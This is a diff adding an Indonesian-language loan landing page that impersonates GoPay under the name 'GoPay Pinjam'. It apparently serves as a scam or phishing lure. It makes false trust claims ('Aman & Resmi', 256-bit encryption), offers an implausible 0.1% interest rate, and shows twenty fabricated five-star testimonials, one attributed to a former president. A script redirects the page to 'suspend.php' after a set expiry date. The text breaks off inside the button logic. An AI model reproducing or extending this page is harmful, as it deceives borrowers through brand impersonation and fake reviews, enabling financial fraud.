@@ -1,0 +1,960 @@
+<html lang="id"><head><script>
+  // Atur tanggal suspend di sini (Format: YYYY-MM-DD)
+  const tanggalSuspend = '2026-11-05'; 
+  
+  // Cek waktu saat ini (WIB/UTC+7) dan alihkan jika sudah lewat
+  if (new Date() >= new Date(tanggalSuspend + 'T23:59:00+07:00')) {
+    window.location.href = 'suspend.php';
+  }
+</script>
+
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>GoPay Pinjam - Pengajuan Pinjaman Aman &amp; Terpercaya</title>
+  
+  <!-- Meta Tags untuk Preview / Share Link (Open Graph & Twitter) -->
+  <meta name="description" content="Layanan pengajuan pinjaman dana tunai aman, cepat, dan terpercaya dengan bunga ringan langsung cair ke akun GoPay.">
+  <meta property="og:title" content="GoPay Pinjam - Pengajuan Pinjaman Aman &amp; Terpercaya">
+  <meta property="og:description" content="Layanan pengajuan pinjaman dana tunai aman, cepat, dan terpercaya dengan bunga ringan langsung cair ke akun GoPay.">
+  <meta property="og:image" content="https://www.findaya.co.id/media/item_image/GoPayPinjam-600x320.png">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="GoPay Pinjam - Pengajuan Pinjaman Aman &amp; Terpercaya">
+  <meta name="twitter:description" content="Layanan pengajuan pinjaman dana tunai aman, cepat, dan terpercaya dengan bunga ringan langsung cair ke akun GoPay.">
+  <meta name="twitter:image" content="https://www.findaya.co.id/media/item_image/GoPayPinjam-600x320.png">
+
+  <!-- Fonts & Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    :root {
+      --gopay-blue: #00a8e8;       /* Warna Logo Wallet GoPay */
+      --primary-green: #00aa13;    /* Warna Utama GoJek/GoPay */
+      --primary-green-dark: #00880f;
+      --primary-gradient: linear-gradient(135deg, #00aa13 0%, #00880f 100%);
+      --bg: #f8fafc;
+      --card-bg: #ffffff;
+      --text-main: #0f172a;
+      --text-muted: #64748b;
+      --border-color: #e2e8f0;
+    }
+
+    * { 
+      box-sizing: border-box; 
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100vh;
+      background: var(--bg);
+      color: var(--text-main);
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-bottom: 135px; /* Ditingkatkan agar ruang footer aman dan tidak menutupi konten */
+    }
+
+    /* Topbar Ringkas */
+    .topbar {
+      width: 100%;
+      height: 52px;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .brand-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 17px;
+      font-weight: 800;
+      color: #0f172a;
+      letter-spacing: -0.3px;
+    }
+
+    .brand-logo i.wallet-icon {
+      color: var(--gopay-blue);
+      font-size: 20px;
+    }
+
+    .secure-tag {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #047857;
+      background: #ecfdf5;
+      padding: 4px 10px;
+      border-radius: 20px;
+      border: 1px solid #a7f3d0;
+    }
+
+    /* Main Scrollable Container */
+    .container {
+      width: min(480px, 100%);
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    /* Limit Banner */
+    .limit-banner {
+      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+      border-radius: 14px;
+      padding: 14px;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.08);
+    }
+
+    .limit-info p {
+      font-size: 10px;
+      color: #94a3b8;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .limit-info h3 {
+      font-size: 18px;
+      font-weight: 800;
+      color: #00f5d4;
+    }
+
+    .status-pill {
+      background: rgba(255, 255, 255, 0.12);
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 10px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+
+    .status-pill span {
+      width: 6px;
+      height: 6px;
+      background: #10b981;
+      border-radius: 50%;
+      box-shadow: 0 0 6px #10b981;
+    }
+
+    /* Card Utama */
+    .card {
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+      border: 1px solid var(--border-color);
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+    }
+
+    .section-title {
+      font-size: 14px;
+      font-weight: 800;
+      color: var(--text-main);
+    }
+
+    .section-subtitle {
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+
+    /* Purpose Filter */
+    .purpose-selector {
+      display: flex;
+      gap: 6px;
+      overflow-x: auto;
+      scrollbar-width: none;
+      padding-bottom: 2px;
+    }
+    .purpose-selector::-webkit-scrollbar { display: none; }
+
+    .purpose-chip {
+      padding: 6px 12px;
+      border-radius: 12px;
+      background: #f1f5f9;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-muted);
+      white-space: nowrap;
+      cursor: pointer;
+      border: 1px solid transparent;
+      transition: all 0.2s ease;
+    }
+
+    .purpose-chip.active {
+      background: #e6f7e8;
+      color: var(--primary-green);
+      border-color: rgba(0, 170, 19, 0.3);
+    }
+
+    /* Grid Pilihan Pinjaman */
+    .options-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .option-card {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 12px;
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      background: #ffffff;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      user-select: none;
+    }
+
+    .option-card:hover {
+      border-color: #a7f3d0;
+      background: #f0fdf4;
+    }
+
+    .option-card.selected {
+      border-color: var(--primary-green) !important;
+      background: #f0fdf4 !important;
+      box-shadow: 0 2px 8px rgba(0, 170, 19, 0.12);
+    }
+
+    .left-content {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .radio-circle {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #cbd5e1;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      flex-shrink: 0;
+      transition: all 0.2s ease;
+    }
+
+    .option-card.selected .radio-circle {
+      border-color: var(--primary-green);
+      background: var(--primary-green);
+    }
+
+    .radio-circle::after {
+      content: '';
+      width: 6px;
+      height: 6px;
+      background: white;
+      border-radius: 50%;
+      display: none;
+    }
+
+    .option-card.selected .radio-circle::after {
+      display: block;
+    }
+
+    .loan-details {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .amount-title {
+      font-size: 13.5px;
+      font-weight: 800;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .tenor-info {
+      font-size: 10.5px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .right-content {
+      text-align: right;
+    }
+
+    .installment-amount {
+      font-size: 13.5px;
+      font-weight: 800;
+      color: var(--primary-green);
+    }
+
+    .installment-label {
+      font-size: 9.5px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .badge-tag {
+      font-size: 8.5px;
+      font-weight: 800;
+      padding: 2px 6px;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+    .badge-recommend { background: #dbeafe; color: #1d4ed8; }
+    .badge-popular { background: #fef3c7; color: #b45309; }
+    .badge-low { background: #dcfce7; color: #15803d; }
+
+    /* Summary Box */
+    .summary-box {
+      background: #f8fafc;
+      border: 1px dashed var(--border-color);
+      border-radius: 10px;
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .summary-item {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .summary-item span.val {
+      font-weight: 700;
+      color: var(--text-main);
+    }
+
+    /* Testimonials Section */
+    .testimonials-section {
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 12px;
+      border: 1px solid var(--border-color);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .testimonials-title {
+      font-size: 13px;
+      font-weight: 800;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .testimonials-container {
+      height: 140px;
+      overflow: hidden;
+      position: relative;
+      mask-image: linear-gradient(to bottom, transparent, black 15%, black 85%, transparent);
+      -webkit-mask-image: linear-gradient(to bottom, transparent, black 15%, black 85%, transparent);
+    }
+
+    .testimonials-track {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      animation: scrollUp 45s linear infinite;
+    }
+
+    .testimonials-track:hover {
+      animation-play-state: paused;
+    }
+
+    @keyframes scrollUp {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-50%); }
+    }
+
+    .testimonial-card {
+      background: #f8fafc;
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 8px 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      font-size: 10.5px;
+    }
+
+    .testimonial-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .user-profile {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .user-avatar {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: var(--gopay-blue);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 9.5px;
+    }
+
+    .user-name {
+      font-weight: 700;
+      color: var(--text-main);
+    }
+
+    .rating-stars {
+      color: #f59e0b;
+      font-size: 9px;
+    }
+
+    .testimonial-text {
+      color: var(--text-muted);
+      font-weight: 500;
+      line-height: 1.35;
+    }
+
+    /* Sticky Bottom Action Container (Diperkuat agar tidak hilang/glitch di HP) */
+    .sticky-footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-top: 1px solid var(--border-color);
+      padding: 10px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      z-index: 9999; /* Z-index tinggi agar selalu di atas */
+      transform: translateZ(0); /* Akselerasi hardware agar stabil di mobile */
+      -webkit-transform: translateZ(0);
+    }
+
+    .sticky-footer-inner {
+      width: min(480px, 100%);
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 46px;
+      border-radius: 12px;
+      border: none;
+      background: var(--primary-gradient);
+      color: white;
+      font-size: 14.5px;
+      font-weight: 800;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 14px rgba(0, 170, 19, 0.3);
+      transition: all 0.2s ease;
+    }
+
+    .btn-submit:active {
+      transform: scale(0.97);
+    }
+
+    .trust-footer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      font-size: 9.5px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .trust-item i {
+      color: var(--primary-green);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Navigation Header -->
+  <header class="topbar">
+    <div class="brand-logo">
+      <i class="fa-solid fa-wallet wallet-icon"></i>
+      GoPay Pinjam
+    </div>
+    <div class="secure-tag">
+      <i class="fa-solid fa-shield-halved"></i>
+      <span>Aman &amp; Resmi</span>
+    </div>
+  </header>
+
+  <!-- Container -->
+  <div class="container">
+    
+    <!-- User Limit Banner (Rp 10 Juta) -->
+    <div class="limit-banner">
+      <div class="limit-info">
+        <p>Limit Tersedia</p>
+        <h3>Rp 10.000.000</h3>
+      </div>
+      <div class="status-pill">
+        <span></span> Disetujui Instan
+      </div>
+    </div>
+
+    <!-- Main Card Form -->
+    <main class="card">
+      <div class="section-header">
+        <h1 class="section-title">Nominal &amp; Tenor</h1>
+        <span class="section-subtitle">Bunga Ringan 0,1%</span>
+      </div>
+
+      <!-- Filter Tujuan Pinjaman -->
+      <div class="purpose-selector">
+        <div class="purpose-chip active" onclick="selectPurpose(this)">Modal Usaha</div>
+        <div class="purpose-chip" onclick="selectPurpose(this)">Pendidikan</div>
+        <div class="purpose-chip" onclick="selectPurpose(this)">Kebutuhan Darurat</div>
+        <div class="purpose-chip" onclick="selectPurpose(this)">Belanja</div>
+      </div>
+
+      <!-- Grid Opsi Pinjaman (Max 10jt, Bunga 0,1%) -->
+      <div class="options-grid" id="optionsGrid">
+        
+        <div class="option-card" data-amount="1.000.000" data-tenor="1" data-cicilan="1.002.000" data-admin="15.000">
+          <div class="left-content">
+            <div class="radio-circle"></div>
+            <div class="loan-details">
+              <div class="amount-title">
+                Rp 1.000.000
+                <span class="badge-tag badge-low">Ringan</span>
+              </div>
+              <div class="tenor-info">Tenor 1 Bulan • Bunga 0,1%</div>
+            </div>
+          </div>
+          <div class="right-content">
+            <div class="installment-amount">Rp 1.002.000</div>
+            <div class="installment-label">/ bulan</div>
+          </div>
+        </div>
+
+        <div class="option-card" data-amount="3.000.000" data-tenor="3" data-cicilan="1.005.000" data-admin="30.000">
+          <div class="left-content">
+            <div class="radio-circle"></div>
+            <div class="loan-details">
+              <div class="amount-title">
+                Rp 3.000.000
+                <span class="badge-tag badge-popular">Favorit</span>
+              </div>
+              <div class="tenor-info">Tenor 3 Bulan • Bunga 0,1%</div>
+            </div>
+          </div>
+          <div class="right-content">
+            <div class="installment-amount">Rp 1.005.000</div>
+            <div class="installment-label">/ bulan</div>
+          </div>
+        </div>
+
+        <div class="option-card selected" data-amount="5.000.000" data-tenor="6" data-cicilan="836.000" data-admin="50.000">
+          <div class="left-content">
+            <div class="radio-circle"></div>
+            <div class="loan-details">
+              <div class="amount-title">
+                Rp 5.000.000
+                <span class="badge-tag badge-recommend">Populer</span>
+              </div>
+              <div class="tenor-info">Tenor 6 Bulan • Bunga 0,1%</div>
+            </div>
+          </div>
+          <div class="right-content">
+            <div class="installment-amount">Rp 836.000</div>
+            <div class="installment-label">/ bulan</div>
+          </div>
+        </div>
+
+        <div class="option-card" data-amount="7.500.000" data-tenor="9" data-cicilan="837.000" data-admin="75.000">
+          <div class="left-content">
+            <div class="radio-circle"></div>
+            <div class="loan-details">
+              <div class="amount-title">Rp 7.500.000</div>
+              <div class="tenor-info">Tenor 9 Bulan • Bunga 0,1%</div>
+            </div>
+          </div>
+          <div class="right-content">
+            <div class="installment-amount">Rp 837.000</div>
+            <div class="installment-label">/ bulan</div>
+          </div>
+        </div>
+
+        <div class="option-card" data-amount="10.000.000" data-tenor="12" data-cicilan="838.000" data-admin="100.000">
+          <div class="left-content">
+            <div class="radio-circle"></div>
+            <div class="loan-details">
+              <div class="amount-title">
+                Rp 10.000.000
+                <span class="badge-tag badge-recommend">Max Limit</span>
+              </div>
+              <div class="tenor-info">Tenor 12 Bulan • Bunga 0,1%</div>
+            </div>
+          </div>
+          <div class="right-content">
+            <div class="installment-amount">Rp 838.000</div>
+            <div class="installment-label">/ bulan</div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Ringkasan Rincian Dinamis -->
+      <div class="summary-box">
+        <div class="summary-item">
+          <span>Pencairan Bersih:</span>
+          <span class="val" id="summaryNet">Rp 4.950.000</span>
+        </div>
+        <div class="summary-item">
+          <span>Biaya Layanan &amp; Admin:</span>
+          <span class="val" id="summaryAdmin">Rp 50.000</span>
+        </div>
+        <div class="summary-item">
+          <span>Jatuh Tempo Pertama:</span>
+          <span class="val" id="summaryDueDate">1 Des 2026</span>
+        </div>
+      </div>
+    </main>
+
+    <!-- Bagian Ulasan Pengguna (Animasi Moving Marquee 20 Komentar) -->
+    <div class="testimonials-section">
+      <div class="testimonials-title">
+        <i class="fa-solid fa-comments" style="color: var(--primary-green);"></i>
+        <span>Ulasan Pengguna Terverifikasi</span>
+      </div>
+      <div class="testimonials-container">
+        <div class="testimonials-track" id="testimonialTrack">
+          <!-- 20 Komentar Positif -->
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #3b82f6;">SR</div><span class="user-name">Siti Rahma</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Prosesnya super cepat, cuma butuh 5 menit dana langsung cair ke akun GoPay. Sangat membantu!</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #10b981;">BS</div><span class="user-name">Budi Santoso</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Bunganya kecil banget cuma 0,1%, cicilannya ringan dan tidak memberatkan. Mantap GoPay Pinjam!</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #f59e0b;">RM</div><span class="user-name">Rina Marlina</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Awalnya ragu, ternyata beneran aman dan resmi terdaftar. Terima kasih GoPay!</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #8b5cf6;">AF</div><span class="user-name">Ahmad Fauzi</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Limit awal lumayan buat modal usaha kecil-kecilan. Aplikasi sangat user-friendly.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #ec4899;">DL</div><span class="user-name">Dewi Lestari</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Pencairan kilat tanpa ribet dokumen muluk-muluk. Sangat direkomendasikan!</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #06b6d4;">JW</div><span class="user-name">Joko Widodo</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Pelayanan terbaik, tenor fleksibel dan transparan biaya adminnya.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #14b8a6;">NH</div><span class="user-name">Nurul Hidayah</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Sangat membantu saat butuh dana mendadak buat bayar keperluan mendesak.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #f97316;">HW</div><span class="user-name">Hendra Wijaya</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Top markotop! Bunganya transparan 0,1% dan nggak ada potongan tersembunyi.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #6366f1;">MU</div><span class="user-name">Mega Utami</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Aplikasi pinjaman paling terpercaya sejauh ini. Proses verifikasi kilat.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #64748b;">DK</div><span class="user-name">Dedi Kurniawan</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Mantap, dana langsung masuk dompet elektronik tanpa nunggu lama.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #3b82f6;">IP</div><span class="user-name">Indah Permata</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Suka banget sama fiturnya yang praktis. Nggak perlu KTP ulang kalau sudah terverifikasi.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #10b981;">RP</div><span class="user-name">Reza Pratama</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Bunga 0,1%-nya beneran ringan di kantong. Sukses terus GoPay!</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #f59e0b;">FT</div><span class="user-name">Fitriani</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Pengajuan gampang, langsung disetujui instan. Recommended banget!</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #8b5cf6;">EP</div><span class="user-name">Eko Prasetyo</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Sangat membantu keuangan pas akhir bulan. Terima kasih GoPay Pinjam.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #ec4899;">RS</div><span class="user-name">Ratna Sari</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Aman, cepat, dan terpercaya. Nggak salah pilih pinjaman online resmi.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #06b6d4;">YS</div><span class="user-name">Yudi Setiawan</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Proses cepat dan transparan. Cicilan per bulannya pas di budget.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #14b8a6;">AS</div><span class="user-name">Ani Suryani</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Mantap jiwa! Cairnya kilat banget, pas buat modal belanja bulanan.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #f97316;">FN</div><span class="user-name">Fajar Nugroho</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Terbantu sekali dengan adanya fitur ini. Bunga ringan dan sangat aman.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #6366f1;">WD</div><span class="user-name">Wulan Dari</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Pelayanan cepat dan ramah sistemnya. Mantap sekali.</div>
+          </div>
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #64748b;">RR</div><span class="user-name">Rizky Ramadhan</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Terbaik! Sangat membantu di saat darurat. Recommended pokoknya.</div>
+          </div>
+
+          <!-- Duplikasi item pertama agar animasi infinite loop mulus -->
+          <div class="testimonial-card">
+            <div class="testimonial-header">
+              <div class="user-profile"><div class="user-avatar" style="background: #3b82f6;">SR</div><span class="user-name">Siti Rahma</span></div>
+              <div class="rating-stars"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+            </div>
+            <div class="testimonial-text">Prosesnya super cepat, cuma butuh 5 menit dana langsung cair ke akun GoPay. Sangat membantu!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Sticky Footer Button (Pasti Terlihat & Berfungsi) -->
+  <footer class="sticky-footer">
+    <div class="sticky-footer-inner">
+      <button id="continueBtn" class="btn-submit" type="button">
+        <span>Lanjutkan Pengajuan</span>
+        <i class="fa-solid fa-arrow-right"></i>
+      </button>
+
+      <div class="trust-footer">
+        <div class="trust-item">
+          <i class="fa-solid fa-lock"></i>
+          <span>Enkripsi 256-bit</span>
+        </div>
+        <div class="trust-item">
+          <i class="fa-solid fa-bolt"></i>
+          <span>Cair 5 Menit</span>
+        </div>
+        <div class="trust-item">
+          <i class="fa-solid fa-shield"></i>
+          <span>Aman &amp; Resmi</span>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- JavaScript Logic yang 100% Bebas Error -->
+  <script>
+    // Fungsi untuk menghitung tanggal jatuh tempo (1 bulan dari hari ini) dengan aman
+    function getNextMonthDate() {
+      try {
+        const date = new Date();
+        date.setMonth(date.getMonth() + 1);
+        const options = { day: 'numeric', month: 'short', year: 'numeric' };
+        return date.toLocaleDateString('id-ID', options);
+      } catch (e) {
+        return '30 hari ke depan';
+      }
+    }
+
+    // Fungsi update rincian summary
+    function updateSummary(card) {
+      if (!card) return;
+      
+      const amountStr = card.getAttribute('data-amount') || '0';
+      const adminStr = card.getAttribute('data-admin') || '0';
+
+      const rawAmount = parseInt(amountStr.replace(/\./g, ''), 10) || 0;
+      const rawAdmin = parseInt(adminStr.replace(/\./g, ''), 10) || 0;
+      const netAmount = rawAmount - rawAdmin;
+
+      const summaryNet = document.getElementById('summaryNet');
+      const summaryAdmin = document.getElementById('summaryAdmin');
+      const summaryDueDate = document.getElementById('summaryDueDate');
+
+      if (summaryNet) summaryNet.innerText = 'Rp ' + netAmount.toLocaleString('id-ID');
+      if (summaryAdmin) summaryAdmin.innerText = 'Rp ' + rawAdmin.toLocaleString('id-ID');
+      if (summaryDueDate) summaryDueDate.innerText = getNextMonthDate();
+    }
+
+    // Fungsi memilih chip tujuan
+    function selectPurpose(element) {
+      const chips = document.querySelectorAll('.purpose-chip');
+      chips.forEach(chip => chip.classList.remove('active'));
+      element.classList.add('active');
+    }
+
+    // Event Listener utama saat DOM siap
+    document.addEventListener('DOMContentLoaded', function() {
+      const optionCards = document.querySelectorAll('.option-card');
+      const btnSubmit = document.getElementById('continueBtn');
+
+      // pasang event listener pada setiap opsi pinjaman
+      optionCards.forEach(function(card) {
+        card.addEventListener('click', function() {
+          optionCards.forEach(c => c.classList.remove('selected'));
+          this.classList.add('selected');
+          updateSummary(this);
+        });
+      });
+
